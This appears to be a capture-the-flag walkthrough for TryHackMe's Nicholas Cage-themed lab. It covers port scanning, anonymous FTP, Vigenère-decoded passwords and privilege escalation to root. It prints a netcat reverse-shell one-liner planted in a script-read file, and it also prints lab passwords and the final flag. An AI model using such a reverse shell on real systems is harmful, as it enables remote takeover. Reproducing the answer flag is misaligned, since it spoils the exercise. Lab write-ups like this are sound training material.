
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Break_out_the_cage/images/72-1.png)

This is a CTF room with the theme Nicholas Cage.

I started by scanning the target server using nmap to identify any open ports and later on performing a more in depth scan with 2 special arguments to get more information about the services running on those ports.

```text

nmap -sS -T 4 -p- 10.10.106.34
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 04:18 EDT
Nmap scan report for 10.10.106.34
Host is up (0.067s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```text
nmap -sC -sV -T 4 -p21,22,80 10.10.106.34
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 04:21 EDT
Nmap scan report for 10.10.106.34
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.5.181
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Taking a look at the second scan i noticed the ftp server allows anonymous login and decided to start enumerating with this service. There i noticed a file dad_tasks and downloaded it hoping it hold something of use. 

```text
ftp 10.10.106.34
Connected to 10.10.106.34.
220 (vsFTPd 3.0.3)
Name (10.10.106.34:root): ftp 
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 25 23:32 .
drwxr-xr-x    2 0        0            4096 May 25 23:32 ..
-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
226 Directory send OK.
```

The file look like is base64 encoded

```text
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
```

After decoding it i got this encrypted text which at first i thought it was caesar encoded and tried other online tools but in the end i got nowhere and decided to move on.

```text

Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

The next service i looked into was the http service. The welcome page had nothing of use and i decided to find some hidden directories using gobuster.

```text
gobuster dir -u 10.10.106.34 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.106.34
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/31 05:13:56 Starting gobuster
===============================================================
/images (Status: 301)
/html (Status: 301)
/scripts (Status: 301)
/contracts (Status: 301)
/auditions (Status: 301)
/server-status (Status: 403)
```

There are a few folder but the only useful one was the /auditions folder. After a bit of fiddling with SonicVisualiser i found a hidden string.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Break_out_the_cage/images/72-2.png)

I spent some time trying to figure it out where could i use this string, but in the end i remembered i had an encrypted text and this could be the key to decrypt it. I used decode.fr with vigenere cipher and decoded to:

```text
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes

```
This password can be used to login to the ssh service with username weston (this is given in  one of the challenge tasks).

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Break_out_the_cage/images/72-3.png)

The user has sudo perminssions on the binary bees.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Break_out_the_cage/images/72-4.png)

The binary uses the wall command to echo the string below.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Break_out_the_cage/images/72-5.png)

I decided to enumerate the other user too, as it could own some files which may be useful.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Break_out_the_cage/images/72-6.png)

In the .dads_scripts i modified the file .quotes which obviously contained some quotes, and use it as a reverse shell.
```bash
echo ';rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.8.5.181 1234 > /tmp/f' > .files/.quotes 
```

I started the listener, and now i am the user cage.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Break_out_the_cage/images/72-7.png)

Here is a flag.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Break_out_the_cage/images/72-8.png)

Let's further enumerate the contents of email_backup directory.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Break_out_the_cage/images/72-9.png)

Email one
```text
From - SeanArcher@BigManAgents.com
To - Cage@nationaltreasure.com

Hey Cage!

There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
planning stages at the moment. I've put a good word in for you, if you're lucky we 
might be able to get you a part of an angry shop keeping or something? Would you be up
for that, the money would be good and it'd look good on your acting CV.

Regards

Sean Archer
```
Email 2
```text
From - Cage@nationaltreasure.com
To - SeanArcher@BigManAgents.com

Dear Sean

We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
I could of made them great... great Sean.... I think you're missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage

```

Email 3

```text
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage

```
As before i tried most of the well known encoding ciphers, but none of them worked. In the end i tried again the vigenere cipher on the ciphertext haiinspsyanileph with password face and got: cageisnotalegend. I logged in as root and looked through it's folder and found this emails:

```text
From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com

Good Evening Master

My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.

Thank you

Sean Archer
```
This email has the flag.

```text
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}

Thank you

Sean Archer

```










